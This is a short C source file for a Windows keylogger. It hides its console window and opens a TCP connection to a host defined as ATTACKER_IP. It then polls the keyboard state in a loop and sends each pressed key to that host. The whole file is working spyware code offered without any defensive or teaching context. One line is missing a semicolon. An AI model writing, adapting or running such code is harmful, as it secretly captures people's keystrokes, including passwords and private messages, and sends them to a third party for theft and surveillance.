#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")

#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define ATTACKER_IP "10.0.2.15"

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY;
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_addr.s_addr = inet_addr(ATTACKER_IP)
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);

    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    // collect the pressed keys
    while (true) {
	Sleep(10);	// pause for 10 milliseconds
	// check if this is a printable key (keycodes defined by Microsoft)
	for (int KEY = 0x8; KEY < 0xFF; KEY++) {
	    if (GetAsyncKeyState(KEY) == -32767) {// if key was pressed
	    	char buffer[2];
		buffer[0] = KEY;
		send(server, buffer, sizeof(buffer), 0);
	    }
	}
    }

    // cleanup
    closesocket(server);
    WSACleanup();
}
